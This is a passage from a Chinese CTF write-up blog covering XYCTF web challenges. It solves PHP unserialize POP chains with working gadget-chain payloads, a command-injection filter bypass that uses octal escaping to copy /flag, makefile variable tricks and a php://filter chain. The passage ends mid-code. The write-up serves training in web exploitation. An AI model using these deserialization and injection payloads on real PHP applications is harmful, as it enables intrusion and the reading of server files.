class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AAA</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$s</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you get 2 A &lt;br&gt;&quot;</span>;<br>        <span class="hljs-variable">$p</span> = <span class="hljs-variable language_">$this</span>-&gt;a;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;s-&gt;<span class="hljs-variable">$p</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BBB</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$d</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you get 2 B &lt;br&gt;&quot;</span>;<br>        <span class="hljs-variable">$a</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>        <span class="hljs-variable">$b</span>=<span class="hljs-variable">$_POST</span>;<br>        <span class="hljs-variable">$c</span>=<span class="hljs-variable language_">$this</span>-&gt;c;<br>        <span class="hljs-variable">$d</span>=<span class="hljs-variable language_">$this</span>-&gt;d;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$b</span>[<span class="hljs-string">&#x27;a&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$b</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<br>        &#125;<br>        <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span>)(<span class="hljs-variable">$c</span>)(<span class="hljs-variable">$d</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CCC</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you get 2 C &lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;c;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;xy&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;xy&#x27;</span>]);<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;noooooob!!!&quot;</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>还有点长，简单的要分析一下，要得到flag,正常是反向推理。要得到flag大概率是<code>call_user_func($a,$b)($c)($d);</code>这个实现的，简单来说这是个嵌套的函数。<code>__get</code>是调用的成员属性不存在,才会调用。而AAA里的<code>$this-&gt;s-&gt;$p;</code> 可以进行调用一个不存在的从而实现调用。<code>__toString</code>把对象当成字符串调用，通常echo就可以调用成功。<code>echo $this-&gt;c;</code>就可以实现。那么显而易见大概的流程已经出来了。</p><p>CCC::destruct  —&gt; AAA::toString—&gt;BBB::get，这样的大体流程。下面我们上代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AAA</span> </span>&#123;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$s</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>; <br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BBB</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>=<span class="hljs-string">&quot;echo system&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$d</span>=<span class="hljs-string">&quot;cat /flag&quot;</span>; <br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CCC</span></span><br><span class="hljs-class"></span>&#123; <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>; <br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> CCC;<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> AAA;<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> BBB;<br><span class="hljs-variable">$a</span>-&gt;c=<span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$b</span>-&gt;s=<span class="hljs-variable">$c</span>;<br><span class="hljs-variable">$b</span>-&gt;a=<span class="hljs-string">&quot;eval&quot;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br></code></pre></td></tr></table></figure><p>$a&#x3D;new CCC;实例化调用__destruct(),之后就可以通过echo调用__tostring().里面调用<code>$p = $this-&gt;a;</code></p><p>只要给a赋值BBB不存在的变量然后通过return，就能调用__get().</p><p>这里还要介绍一下implode函数，implode函数可以拼接内容，把后面的$b,c,d连起来构成语句</p><p>$c,$d已经赋值好了，还需要post传值<img src="/../images/xyctf/ezpop.png" alt="ezpop"></p><p>$b也可以传入exec,最后还有个小tip,原文都是2A,2B,2C，需要把类后面的属性即CCC后面的1改成2.</p><p>大题思路是这样，中间可能有冗杂的内容，至少把题目写出来了。</p><h2 id="牢牢记住，逝者为大"><a href="#牢牢记住，逝者为大" class="headerlink" title="牢牢记住，逝者为大"></a>牢牢记住，逝者为大</h2><p><img src="/../images/xyctf/%E7%89%A2%E5%A4%A7.png" alt="牢大"></p><p>so,what can i say,manba out</p><p>这题还是有许多值得学习的知识点的，先简要分析一下。</p><p>cmd的长度不能大于13</p><p>内容禁用的挺多的，如上</p><p>大致思路是需要拼接最后得到的，因为下方有个eval函数。</p><p>既然都禁了那我尝试转义吧，转十六进制可能会出现f,会被禁用，那么我们就转八进制。</p><p><img src="/../images/xyctf/laoda1.png" alt="laoda1"></p><p>处于编码问题我们都是加一个\0,如下</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">\<span class="hljs-number">0143\0160</span>\<span class="hljs-number">0040\0057</span>\<span class="hljs-number">0146\0154</span>\<span class="hljs-number">0141\0147</span>\<span class="hljs-number">0040\0057</span>\<span class="hljs-number">0166\0141</span>\<span class="hljs-number">0162\0057</span>\<span class="hljs-number">0167\0167</span>\<span class="hljs-number">0167\0057</span>\<span class="hljs-number">0150\0164</span>\<span class="hljs-number">0155\0154</span>\<span class="hljs-number">0057\0061</span>\<span class="hljs-number">0056\0164</span>\<span class="hljs-number">0170\0164</span>\<span class="hljs-number">0012</span>   ，最后的是换号符<br></code></pre></td></tr></table></figure><p>再看前面要过滤man和mamba out,前面可以考虑换行%0A,后面%23注释掉就行</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?cmd=%0A<span class="hljs-string">`$_GET[1]`</span>;%23&amp;<span class="hljs-number">1</span>=%24(echo -e <span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p>反引号用于执行，%24是$,echo -e 用于执行转义，加上面的放入下面的代码中就可以实行。最后再切换到1.txt,得到答案。</p><p><img src="/../images/xyctf/lao2.png" alt="lao2"></p><h2 id="以下为复现（-εZ-¿м-Kε¿"><a href="#以下为复现（-εZ-¿м-Kε¿" class="headerlink" title="以下为复现（  εZ?¿м@Kε¿?"></a>以下为复现（  εZ?¿м@Kε¿?</h2><p><a href="https://blog.csdn.net/ZBraveHeart/article/details/123187908?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522171412303116777224485918%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=171412303116777224485918&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-123187908-null-null.142%5Ev100%5Epc_search_result_base1&utm_term=makefile&spm=1018.2226.3001.4187">知识点</a>，写这题之前可以看看这篇的知识点，简要的了解一下。<img src="/../images/xyctf/%CE%B5Z%C2%BF%D0%BC@K%CE%B5%C2%BF.png" alt="εZ¿м@Kε¿"></p><p>尝试了第一种和第二种都不行，看了其他师傅的wp，考察的可能是真的是makefile的知识点，之前也没搜过这方面的内容，就小学一下吧。这里简单的说一下。</p><p>$符号表示取变量的值，当变量名多于一个字符时，使用”( )”<br>$符的其他用法</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$^</span> 表示所有的依赖文件<br><span class="hljs-variable">$@</span> 表示生成的目标文件<br><span class="hljs-variable">$&lt;</span> 代表第一个依赖文件<br></code></pre></td></tr></table></figure><p>尝试输入内容。<img src="/../images/xyctf/%EF%BC%9F%EF%BC%9F%EF%BC%9F.png" alt="？？？"></p><p>得知当前的依赖文件里面就是flag.</p><p>$&lt;,显示的是&#x2F;flag，那么&lt;$&lt;也就是&lt;&#x2F;flag,由上面得知多于一个字符需要使用括号，那么就先构造**$(&lt;$&lt;)**,我的理解是取进去flag文件</p><p>里面的值，先输入看看，这是下面的回显。</p><figure class="highlight ocaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ocaml"><span class="hljs-type">Nothing</span> <span class="hljs-keyword">to</span> be <span class="hljs-keyword">done</span> <span class="hljs-keyword">for</span> <span class="hljs-symbol">&#x27;FLAG&#x27;</span>.<br></code></pre></td></tr></table></figure><p>也就是说**$(&lt;$&lt;)**,可能代表的就是flag这个内容，读取我们需要再加个$</p><p><img src="/../images/xyctf/%EF%BC%9F%EF%BC%9F.png" alt="？？"></p><h2 id="连连看到底是连连什么看"><a href="#连连看到底是连连什么看" class="headerlink" title="连连看到底是连连什么看"></a>连连看到底是连连什么看</h2><p>下载文件。先靠着打断点过了一次关发现并不能得到flag,看到文件里面有what’s_this.php，打开网页看看</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-variable">$p</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/http|=|php|file|:|\/|\?/i&quot;</span>, <span class="hljs-variable">$p</span>))<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;waf!&quot;</span>);<br>&#125;<br><br><span class="hljs-variable">$payload</span>=<span class="hljs-string">&quot;php://filter/<span class="hljs-subst">$p</span>/resource=/etc/passwd&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$payload</span>)===<span class="hljs-string">&quot;XYCTF&quot;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>看了wp,可以看一下这位师傅讲的原理，<a href="https://blog.csdn.net/m0_73512445/article/details/134627841">filterchain</a>，简单的来说就是就是base64只能识别[A-Za-z0-9+&#x2F;&#x3D;]，这些其他的不可见字符会自动忽略。原理大致就是最后只要解密成为XYCTF就可以了，这里师傅推荐的脚本，<a href="https://github.com/synacktiv/php_filter_chain_generator">脚本</a>，直接clone下来就可以用了构造一下</p><p><img src="/../images/xyctf/%E8%BF%9E%E8%BF%9E%E7%9C%8B.png" alt="连连看"></p><p>然后再脚本跑一下，<img src="/../images/xyctf/%E8%BF%9E%E8%BF%9E%E7%9C%8B1.png" alt="连连看1"></p><p>最后末尾要改一下，根据题目的设定以及要多解几次base64，多修改几次也就得到flag了。</p><p><img src="/../images/xyctf/%E8%BF%9E%E8%BF%9E%E7%9C%8B2.png" alt="连连看2"></p><h2 id="ezSerialize"><a href="#ezSerialize" class="headerlink" title="ezSerialize"></a>ezSerialize</h2><p>哎，看到序列化反序列化就不想写，太菜了，先看下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;token = <span class="hljs-variable">$a</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$b</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;token === <span class="hljs-variable language_">$this</span>-&gt;password;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$pop</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>    <span class="hljs-variable">$pop</span>-&gt;token=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">mt_rand</span>());<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$pop</span>-&gt;<span class="hljs-title function_ invoke__">login</span>()) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>这题第一层其实是原题，是ctfshow上面的，<a href="https://blog.csdn.net/Kracxi/article/details/122887126">链接</a>，由于md5(mt_rand())在变化而且很难爆破，只要让token&#x3D;password就行我们写个代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>;<br><span class="hljs-variable">$a</span>-&gt;password=&amp;<span class="hljs-variable">$a</span>-&gt;token;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p><img src="/../images/xyctf/serialize.png" alt="serialize"></p><p>进入第二层，贴个源码（真的烦啊.jpg</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mack</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;mack-&gt;<span class="hljs-title function_ invoke__">nonExistentMethod</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$luo</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;o.O&lt;br&gt;&quot;</span>;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;luo;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$wang1</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$wang1</span>,<span class="hljs-variable">$wang2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>            <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag2</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lao</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$chen</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;O.o&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$this</span>-&gt;lao-&gt;chen) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-variable language_">$this</span>-&gt;lao-&gt;chen;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;xxxxx&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$num</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unserialize</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;学到就是赚到!&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;name!=<span class="hljs-string">&#x27;&#x27;</span> || <span class="hljs-variable language_">$this</span>-&gt;num!=<span class="hljs-string">&#x27;&#x27;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;旅行者别忘记旅行的意义!&lt;br&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>&#125; <br></code></pre></td></tr></table></figure><p>静下来分析以下其实第二层也不算太难的还是从后往前推，关键应该在echo $flag2这里</p><p>调用一个不存在的函数可以调用__call()，也就是$this-&gt;mack-&gt;nonExistentMethod();</p><p>__invoke()把对象当成函数就可以调用，return $function()可以解决这个问题。</p><p>__get调用不存在的属性，return is_null($this-&gt;lao-&gt;chen) ? “” : $this-&gt;lao-&gt;chen;可以解决。</p><p>__toString有echo就行，调用__unserialize($data) ,里面的，值得注意的是我看了其他师傅的wp，好像因为php版本问题，这里不能用，下面的wakeup也是可以调用的，分析完我罗列一下。</p><p>E::__wakeup-&gt;D::__tostring-&gt;B::__get-&gt;A::__invoke-&gt;C::__call;</p><p>我们尝试写一下代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mack</span>;<br>    &#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$luo</span>; <br>        &#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span> </span>&#123;<br>       <span class="hljs-keyword">public</span> <span class="hljs-variable">$wang1</span>; <br>       &#125;<br> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$lao</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$chen</span>; <br>        &#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span> </span>&#123;<br>            <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;xxxxx&quot;</span>;<br>            <span class="hljs-keyword">public</span> <span class="hljs-variable">$num</span>; <br>            &#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> E;<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> D;<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> B;<br><span class="hljs-variable">$d</span>=<span class="hljs-keyword">new</span> A;<br><span class="hljs-variable">$e</span>=<span class="hljs-keyword">new</span> C;<br><span class="hljs-variable">$a</span>-&gt;name=<span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$b</span>-&gt;lao=<span class="hljs-variable">$c</span>;<br><span class="hljs-variable">$c</span>-&gt;luo=<span class="hljs-variable">$d</span>;<br><span class="hljs-variable">$d</span>-&gt;mack=<span class="hljs-variable">$e</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p><img src="/../images/xyctf/ser1.png" alt="ser1"></p><p>写完一遍发现也不是很难，看看第三层，先贴代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 